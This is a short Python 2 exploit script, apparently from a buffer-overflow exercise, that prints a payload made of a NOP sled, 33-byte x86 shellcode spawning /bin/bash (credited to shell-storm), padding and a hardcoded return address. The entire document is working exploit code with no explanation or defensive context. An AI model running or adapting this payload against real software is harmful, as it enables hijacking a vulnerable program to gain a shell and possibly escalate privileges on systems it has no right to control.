#!/usr/bin/python

# execve("/bin/bash", ["/bin/bash", NULL]) - 33 bytes
# https://shell-storm.org/shellcode/files/shellcode-606.html

# little-endian
addr = "\x68\xf6\xff\xbf"
nopsled = "\x90" * 75
shellcode = "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80"
padding = "\x90" * 32

print nopsled + shellcode + padding + addr